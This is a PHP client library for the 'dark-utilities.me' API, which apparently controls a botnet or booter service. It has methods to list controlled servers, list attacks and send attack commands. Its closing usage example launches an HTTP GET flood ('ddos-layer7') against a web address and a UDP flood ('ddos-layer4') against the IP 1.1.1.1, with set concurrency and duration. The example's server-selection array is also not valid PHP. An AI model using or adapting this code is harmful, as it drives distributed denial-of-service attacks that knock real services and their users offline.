/**
 * @author Inplex-sys
 */

class DarkUtilities {
   public $base_url;
   public $header;
   
   function __construct( $api_key ){
       $this->base_url = 'https://dark-utilities.me';
       
       $this->header = [
           'Cache-Control: max-age=0',
           'Content-Type: application/json',
           'X-Requested-With: XMLHttpRequest',
           'Authorization: ' . $api_key
       ];
   }
   
   public function getUserInfo() { 
       $request = curl_init($this->base_url . '/api/v1/@me');
       curl_setopt($request, CURLOPT_RETURNTRANSFER, TRUE);
       curl_setopt($request, CURLOPT_HTTPHEADER, $this->header);
       
       return json_decode(curl_exec($request));
   }
   
   public function getServerInfo( $server_digest ) { 
       $request = curl_init($this->base_url . '/api/v1/servers/' . $server_digest);
       curl_setopt($request, CURLOPT_RETURNTRANSFER, TRUE);
       curl_setopt($request, CURLOPT_HTTPHEADER, $this->header);
       
       return json_decode(curl_exec($request));
   }
   
   public function getServerList() { 
       $request = curl_init($this->base_url . '/api/v1/manager');
       curl_setopt($request, CURLOPT_RETURNTRANSFER, TRUE);
       curl_setopt($request, CURLOPT_HTTPHEADER, $this->header);
       
       return json_decode(curl_exec($request));
   }
   
   public function getAttacks() { 
       $request = curl_init($this->base_url . '/api/v1/manager/attacks');
       curl_setopt($request, CURLOPT_RETURNTRANSFER, TRUE);
       curl_setopt($request, CURLOPT_HTTPHEADER, $this->header);
       
       return json_decode(curl_exec($request));
   }
   
   public function sendAttack( $action, $data, $selection = NULL ) { 
       $payload = [
           'selection' => $selection,
           'action' => $action,
           'data' => $data
       ];
       
       $request = curl_init($this->base_url . '/api/v1/manager');
       curl_setopt($request, CURLOPT_RETURNTRANSFER, TRUE);
       curl_setopt($request, CURLOPT_CUSTOMREQUEST, 'POST');
       curl_setopt($request, CURLOPT_POST, 1);
       curl_setopt($request, CURLOPT_POSTFIELDS, json_encode($payload));
       curl_setopt($request, CURLOPT_HTTPHEADER, $this->header);
       
       return json_decode(curl_exec($request));
   }
}

$session = new DarkUtilities('KEY');

echo $session->getUserInfo(); # Return dict with account infos
echo $session->getServerList(); # Return dict with servers list

$selection = [
    {"server_id": "fd06d2f5192fd94341543d15ae8158bb", server_selected: true},
    {"server_id": "3d4154fd8158061d2f5192fd9435aebb", server_selected: true},
    {"server_id": "4154fd06d2f5192fd9433d15ae8158bb", server_selected: true}
];

$session->sendAttack('ddos-layer7', [ # Send layer7 attacks
    'method' => 'GET',
    'target' => 'https://exemple.com/hit',
    'concurrents' => 100,
    'time' => 20
]);

$session->sendAttack('ddos-layer4', [ # Send layer4 attacks
    'method' => 'UDP',
    'target' => '1.1.1.1',
    'port' => 80,
    'concurrents' => 10,
    'time' => 20
]);
